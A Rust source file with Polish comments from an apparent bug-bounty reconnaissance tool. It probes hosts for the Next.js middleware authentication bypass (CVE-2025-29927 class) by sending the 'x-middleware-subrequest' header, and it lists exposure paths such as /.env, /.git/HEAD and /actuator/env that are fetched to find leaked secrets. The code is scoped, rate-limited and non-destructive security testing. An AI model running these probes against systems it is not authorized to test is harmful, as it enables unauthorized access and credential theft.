//! Testy hipotez — każdy JEDNO żądanie porównawcze, zero payloadów niszczących.
//!
//! Zasada: dowód musi być różnicą statusu/kodu odpowiedzi na to samo żądanie,
//! a nie „wygląda podejrzanie". Zgłoszenie bez PoC jest wprost wykluczone (§8 pkt 14.1).

use crate::probe::Probe;
use crate::ratelimit::RateLimiter;
use crate::scope;

/// Next.js middleware auth bypass (klasa CVE-2025-29927).
///
/// Wiele aplikacji Next.js chroni trasy wyłącznie w `middleware.ts`. Nagłówek
/// `x-middleware-subrequest` mówi runtime'owi „to już przeszło przez middleware" —
/// przy podatnej wersji middleware jest pomijany i trasa chroniona zwraca treść.
///
/// Test: pobierz trasę bez nagłówka, potem z nagłówkiem. Różnica 401/403/307 → 200
/// jest mocnym sygnałem. Wysyłamy dokładnie 2 żądania na trasę.
pub fn nextjs_bypass(host: &str, path: &str, rl: &RateLimiter) -> Option<String> {
    let s = scope::in_scope(host)?;
    let base = Probe_min(host, path, rl, &[]);
    let probe = Probe_min(host, path, rl, &[(
        "x-middleware-subrequest",
        "middleware:middleware:middleware:middleware:middleware",
    )]);
    let blocked = matches!(base.0, 401 | 403 | 307 | 308 | 302);
    let opened = probe.0 == 200 && base.0 != 200;
    if blocked && opened {
        return Some(format!(
            "MOŻLIWE OMINIĘCIE MIDDLEWARE: {}:{} {} -> {} (Tier {}, nagroda za krytyczną: {} zł). \
             Potwierdź: (1) czy 200 zawiera dane spoza strony logowania, (2) wersja Next.js z nagłówków/JS.",
            host, path, base.0, probe.0, s.tier, s.max_critical_pln
        ));
    }
    None
}

/// Minimalny probe z dodatkowymi nagłówkami — nie zmienia logiki `probe::probe`.
fn Probe_min(host: &str, path: &str, rl: &RateLimiter, headers: &[(&str, &str)]) -> (u16, String) {
    rl.acquire();
    let url = format!("https://{}{}", host, path);
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(std::time::Duration::from_secs(10))
        .timeout_read(std::time::Duration::from_secs(20))
        .user_agent("Mozilla/5.0 (compatible; naskrecon/0.1)")
        .redirects(0)
        .build();
    let mut req = agent.get(&url);
    for (k, v) in headers {
        req = req.set(k, v);
    }
    match req.call() {
        Ok(r) => (r.status(), r.into_string().unwrap_or_default()),
        Err(ureq::Error::Status(c, r)) => (c, r.into_string().unwrap_or_default()),
        Err(_) => (0, String::new()),
    }
}

/// Ścieżki, które w normalnej aplikacji nigdy nie powinny być publiczne.
/// Każda z nich to JEDNO żądanie GET. Kod 200 + sensowna treść = materiał na zgłoszenie.
pub const EXPOSURE_PATHS: &[(&str, &str, &str)] = &[
    ("/.git/HEAD", "wysoki", "repozytorium git wystawione publicznie → pełny kod źródłowy"),
    ("/.env", "krytyczny", "plik środowiskowy → sekrety, dane dostępowe"),
    ("/.env.local", "krytyczny", "plik środowiskowy → sekrety"),
    ("/config.json", "średni", "konfiguracja aplikacji"),
    ("/backup.zip", "wysoki", "kopia zapasowa"),
    ("/.svn/entries", "wysoki", "metadane SVN"),
    ("/server-status", "średni", "status serwera Apache"),
    ("/actuator/env", "krytyczny", "Spring Boot Actuator → zmienne środowiskowe"),
    ("/actuator/health", "niski", "Spring Boot Actuator"),
    ("/.well-known/security.txt", "info", "kontakt do zespołu bezpieczeństwa (nie podatność)"),
    ("/api/v1/users", "krytyczny", "lista użytkowników bez autoryzacji"),
    ("/api/users", "krytyczny", "lista użytkowników bez autoryzacji"),
    ("/api/v1/config", "wysoki", "konfiguracja przez API"),
    ("/graphql", "średni", "GraphQL — sprawdź introspekcję"),
    ("/swagger.json", "średni", "specyfikacja API"),
    ("/openapi.json", "średni", "specyfikacja API"),
];

/// Czy odpowiedź naprawdę zawiera treść zasobu, czy to SPA-shell / strona błędu.
pub fn looks_real(body: &str, content_type: &str) -> bool {
    let b = body.trim();
    if b.is_empty() || b.len() < 12 {
        return false;
    }
    let low = b.to_ascii_lowercase();
    // typowe fałszywe trafienia: catch-all SPA, strona 404, WAF
    let false_positive = low.starts_with("<!doctype html")
        || low.contains("<title>404")
        || low.contains("page not found")
        || low.contains("access denied");
    if false_positive {
        // ale .git/HEAD jest tekstem, nie HTML — jeśli HTML, to catch-all
        return false;
    }
    let ct = content_type.to_ascii_lowercase();
    ct.contains("json") || b.starts_with("ref:") || b.contains('=')
        || b.contains("{\"") || b.len() < 400
}

#[cfg(test)]
mod tests {
    use super::looks_real;

    #[test]
    fn spa_shell_is_not_a_finding() {
        assert!(!looks_real("<!DOCTYPE html><html><body>x</body></html>", "text/html"));
        assert!(!looks_real("", "application/json"));
    }

    #[test]
    fn git_head_is_a_finding() {
        assert!(looks_real("ref: refs/heads/main\n", "text/plain"));
    }

    #[test]
    fn json_is_a_finding() {
        assert!(looks_real("{\"users\":[]}", "application/json"));
    }
}
